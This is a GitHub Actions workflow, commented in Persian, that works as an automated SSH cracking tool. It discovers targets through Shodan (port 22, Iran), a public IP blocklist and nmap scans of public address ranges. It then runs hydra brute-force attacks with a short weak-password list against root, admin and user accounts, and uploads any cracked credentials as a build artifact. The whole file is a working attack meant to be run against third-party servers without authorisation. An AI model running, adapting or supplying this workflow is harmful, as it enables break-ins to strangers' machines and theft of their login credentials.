name: Auto SSH Cracker - Reliable Discovery

on:
  workflow_dispatch:

jobs:
  crack:
    runs-on: ubuntu-latest
    steps:
      - name: Install tools
        run: sudo apt update && sudo apt install -y hydra sshpass jq curl nmap

      - name: Prepare password dictionary (Top 100 fastest)
        run: |
          cat > fast_pass.txt <<EOF
          123456
          password
          12345678
          qwerty
          abc123
          admin
          root
          12345
          letmein
          welcome
          password123
          admin123
          root123
          123456789
          qwerty123
          1q2w3e
          123123
          admin@123
          root@123
          Pa$$w0rd
          EOF

      - name: Get fresh targets (Auto Discovery)
        id: discovery
        run: |
          TARGETS="targets.txt"
          > $TARGETS

          # روش 1: استفاده از Shodan (اگر API key داشته باشی)
          if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
            echo "Using Shodan API..."
            curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22+country:IR&size=30" | \
              jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS
          fi

          # روش 2: استفاده از لیست تصادفی از وب (مثل فایروال سطح ۱ یا لیست عمومی)
          if [ $(wc -l < $TARGETS) -lt 10 ]; then
            echo "Fetching public IP list from GitHub..."
            curl -s https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/ipv4_firehol_level1.netset | \
              head -200 | while read net; do
                # تبدیل netmask به یه IP نمونه (فقط برای نمونه)
                echo ${net%/*} | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' && echo "${net}:22"
              done | head -50 >> $TARGETS
          fi

          # روش 3: اسکن سریع با nmap روی چند شبکه کلاس C معمول (برای تست داخلی)
          if [ $(wc -l < $TARGETS) -lt 10 ]; then
            echo "Scanning common /24 subnets with nmap..."
            for subnet in 1.1.1.0/24 8.8.8.0/24 4.4.4.0/24 9.9.9.0/24; do
              nmap -Pn -p22 --open -T4 -n --max-rtt-timeout 100ms $subnet | \
                grep -E "Nmap scan report for" | awk '{print $5":22"}' >> $TARGETS
            done
          fi

          # حذف تکراری و خالی
          sort -u -o $TARGETS $TARGETS
          count=$(wc -l < $TARGETS)
          echo "targets_count=$count" >> $GITHUB_OUTPUT
          echo "Found $count targets"

          if [ $count -eq 0 ]; then
            echo "No targets found. You can set SHODAN_API_KEY secret or use a different range."
            exit 1
          fi

      - name: Brute force SSH with Hydra (Turbo)
        run: |
          USERNAMES=("root" "admin" "user")
          FOUND=0
          RESULT_FILE="success.txt"

          while read target; do
            ip=$(echo $target | cut -d: -f1)
            port=$(echo $target | cut -d: -f2)
            for user in "${USERNAMES[@]}"; do
              echo "[*] Attacking $user@$ip:$port"
              # اجرای hydra با خروجی کامل و گرفتن نتیجه
              hydra -l "$user" -P fast_pass.txt -s "$port" -t 64 -f -o hydra.log "$ip" ssh > /dev/null 2>&1
              if grep -q "host: $ip.*password:" hydra.log; then
                pass=$(grep "host: $ip.*password:" hydra.log | head -1 | awk -F 'password: ' '{print $2}')
                echo "✅ SUCCESS: $ip:$port | $user | $pass" | tee -a $RESULT_FILE
                FOUND=1
                break 3
              fi
            done
          done < targets.txt

          if [ $FOUND -eq 1 ]; then
            echo "success=true" >> $GITHUB_OUTPUT
          else
            echo "No credentials found in this batch."
          fi

      - name: Upload credentials
        if: success()
        uses: actions/upload-artifact@v4
        with:
          name: cracked-credentials
          path: success.txt
